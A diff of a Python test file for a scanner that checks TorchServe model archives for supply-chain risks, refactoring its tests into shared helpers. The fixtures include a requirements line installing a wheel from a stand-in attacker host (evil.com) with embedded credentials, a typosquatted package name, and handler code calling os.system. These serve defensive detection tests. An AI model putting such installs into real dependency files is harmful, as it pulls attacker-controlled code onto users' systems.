-            "requirements.txt": b"https://user:pass@evil.com/pkg.whl\n",
-        },
-        filename="requirements_bare_userinfo_direct_url.mar",
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.WARNING
-    assert any(
-        finding["reason"] == "direct_url_install" for finding in requirements_failures[0].details.get("findings", [])
+        (b"https://user:pass@evil.com/pkg.whl\n"),
+        ("requirements_bare_userinfo_direct_url.mar"),
+        ("direct_url_install"),
     )
 
 
 def test_scan_ignores_missing_index_url_value(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"--index-url\nnumpy==1.26.4\n",
-        },
-        filename="requirements_missing_index_value.mar",
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_checks) == 1
-    assert requirements_checks[0].status == CheckStatus.PASSED
+    _assert_clean_requirements(tmp_path, (b"--index-url\nnumpy==1.26.4\n"), ("requirements_missing_index_value.mar"))
 
 
 def test_scan_bounds_requirements_reads_to_dedicated_limit(
@@ -5594,6 +4991,97 @@ def test_scan_only_analyzes_exact_requirements_txt_filename(tmp_path: Path) -> N
 
 
 def test_scan_detects_typo_package_with_inline_hash_comment(tmp_path: Path) -> None:
+    result = _scan_mar_requirements(tmp_path, b"numppy#comment\n", "requirements_typo_hash_comment.mar")
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert any(
+        finding["reason"] == "typosquatting_pattern" for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
+def _assert_handler_dangerous_call(handler_source: bytes, dangerous_name: str) -> None:
+    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
+
+    assert parse_error is None
+    assert dangerous_name in risky_calls
+
+
+def _assert_handler_without_system_call(handler_source: bytes) -> None:
+    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
+
+    assert parse_error is None
+    assert "os.system" not in risky_calls
+
+
+def _assert_getattr_handler_execution(tmp_path: Path, source_bytes: bytes, filename: str) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": source_bytes,
+            "weights.bin": b"weights",
+        },
+        filename=filename,
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
+
+    assert len(handler_failures) == 1
+    assert handler_failures[0].severity == IssueSeverity.CRITICAL
+    assert "os.system" in handler_failures[0].message
+
+
+def _assert_editable_git_warning(tmp_path: Path, requirements: bytes, filename: str) -> None:
+    result = _scan_mar_requirements(tmp_path, requirements, filename)
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.WARNING
+    reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
+    assert "editable_install" in reasons
+    assert "git_install" in reasons
+
+
+def _assert_inert_python_metadata(tmp_path: Path, source_bytes: bytes, filename: str) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
+            "utils.py": (source_bytes),
+            "weights.bin": b"weights",
+        },
+        filename=filename,
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
+    assert non_handler_failures == []
+
+
+def _assert_safe_getattr_handler(tmp_path: Path, source_bytes: bytes, filename: str) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": (source_bytes),
+            "weights.bin": b"weights",
+        },
+        filename=filename,
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
+
+    assert handler_failures == []
+
+
+def _assert_external_requirements_warning(tmp_path: Path, requirements_line: str, filename: str, reason: str) -> None:
     manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
     mar_path = _create_mar_archive(
         tmp_path,
@@ -5601,15 +5089,71 @@ def test_scan_detects_typo_package_with_inline_hash_comment(tmp_path: Path) -> N
         entries={
             "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
             "weights.bin": b"weights",
-            "requirements.txt": b"numppy#comment\n",
+            "requirements.txt": requirements_line.encode("utf-8"),
         },
-        filename="requirements_typo_hash_comment.mar",
+        filename=filename,
     )
 
     result = TorchServeMarScanner().scan(str(mar_path))
     requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
 
     assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.WARNING
+    assert any(finding["reason"] == reason for finding in requirements_failures[0].details.get("findings", []))
+
+
+def _assert_warning_requirements(tmp_path: Path, requirements: bytes, filename: str, reason: str) -> None:
+    result = _scan_mar_requirements(tmp_path, requirements, filename)
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.WARNING
+    assert any(finding["reason"] == reason for finding in requirements_failures[0].details.get("findings", []))
+
+
+def _assert_critical_requirements(tmp_path: Path, requirements: bytes, filename: str) -> None:
+    result = _scan_mar_requirements(tmp_path, requirements, filename)
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
     assert any(
-        finding["reason"] == "typosquatting_pattern" for finding in requirements_failures[0].details.get("findings", [])
+        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
     )
+
+
+def _assert_clean_requirements(tmp_path: Path, requirements: bytes, filename: str) -> None:
+    result = _scan_mar_requirements(tmp_path, requirements, filename)
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_checks) == 1
+    assert requirements_checks[0].status == CheckStatus.PASSED
+
+
+def _scan_mar_requirements(tmp_path: Path, requirements: bytes, filename: str) -> ScanResult:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": requirements,
+        },
+        filename=filename,
+    )
+    result = TorchServeMarScanner().scan(str(mar_path))
+    return result
+
+
+def _install_member_read_failure(monkeypatch: pytest.MonkeyPatch, filename: str) -> None:
+    original_read_member_bounded = TorchServeMarScanner._read_member_bounded
+
+    def read_with_failure(
+        self: TorchServeMarScanner, archive: zipfile.ZipFile, member_info: zipfile.ZipInfo, max_bytes: int
+    ) -> bytes:
+        if member_info.filename == filename:
+            raise RuntimeError("CRC mismatch")
+        return original_read_member_bounded(self, archive, member_info, max_bytes)
+
+    monkeypatch.setattr(TorchServeMarScanner, "_read_member_bounded", read_with_failure)
